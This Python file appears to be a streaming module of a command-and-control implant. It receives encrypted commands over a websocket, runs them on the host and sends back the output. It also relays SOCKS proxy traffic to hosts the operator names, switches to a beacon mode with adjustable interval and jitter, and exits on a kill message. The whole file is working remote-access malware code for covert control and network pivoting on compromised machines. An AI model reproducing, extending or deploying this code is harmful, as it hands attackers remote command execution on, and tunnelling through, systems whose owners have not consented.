"""Streaming Module - Dynamically Loaded"""
import asyncio
import json
import base64


async def heartbeat(websocket, simple_encrypt):
    """Send periodic heartbeat"""
    while True:
        try:
            message = {'type': 'heartbeat'}
            encrypted = simple_encrypt(json.dumps(message))
            await websocket.send(encrypted)
            await asyncio.sleep(10)
        except:
            break


async def socks_proxy_handler(websocket, host: str, port: int, simple_encrypt):
    """Handle SOCKS proxy connection"""
    try:
        reader, writer = await asyncio.open_connection(host, port)

        async def relay_to_server():
            try:
                while True:
                    data = await reader.read(4096)
                    if not data:
                        break
                    msg = {
                        'type': 'socks_data',
                        'data': base64.b64encode(data).decode()
                    }
                    encrypted = simple_encrypt(json.dumps(msg))
                    await websocket.send(encrypted)
            except:
                pass

        return relay_to_server, writer

    except Exception:
        return None, None


async def run_streaming_mode(websocket, agent_id, execute_command, simple_encrypt, simple_decrypt):
    """Main streaming mode handler"""
    heartbeat_task = asyncio.create_task(heartbeat(websocket, simple_encrypt))
    socks_relay_task = None
    socks_writer = None
    beacon_interval = 60

    try:
        async for message in websocket:
            try:
                decrypted = simple_decrypt(message)
                data = json.loads(decrypted)

                if data.get('type') == 'command':
                    command = data.get('command', '')
                    output = execute_command(command)

                    response = {
                        'type': 'response',
                        'output': output,
                        'command': command,
                        'timestamp': data.get('timestamp', '')
                    }
                    encrypted_response = simple_encrypt(json.dumps(response))
                    await websocket.send(encrypted_response)

                elif data.get('type') == 'set_interval':
                    beacon_interval = data.get('interval', beacon_interval)

                elif data.get('type') == 'kill':
                    # Exit agent
                    import sys
                    sys.exit(0)

                elif data.get('type') == 'downgrade_mode':
                    beacon_interval = data.get('interval', beacon_interval)
                    beacon_jitter = data.get('jitter', 0)

                    if heartbeat_task:
                        heartbeat_task.cancel()

                    mode_msg = {
                        'type': 'mode_change',
                        'mode': 'beacon'
                    }
                    encrypted_msg = simple_encrypt(json.dumps(mode_msg))
                    await websocket.send(encrypted_msg)

                    # Return to beacon mode
                    return (beacon_interval, beacon_jitter)

                elif data.get('type') == 'socks_init':
                    pass

                elif data.get('type') == 'socks_connect':
                    host = data.get('host')
                    port = data.get('port')
                    relay_coro, socks_writer = await socks_proxy_handler(websocket, host, port, simple_encrypt)
                    if relay_coro:
                        socks_relay_task = asyncio.create_task(relay_coro())

                elif data.get('type') == 'socks_send':
                    if socks_writer:
                        socks_data = base64.b64decode(data.get('data', ''))
                        socks_writer.write(socks_data)
                        await socks_writer.drain()

            except Exception:
                pass

    finally:
        if heartbeat_task:
            heartbeat_task.cancel()
        if socks_relay_task:
            socks_relay_task.cancel()
        if socks_writer:
            socks_writer.close()
            await socks_writer.wait_closed()

    return None
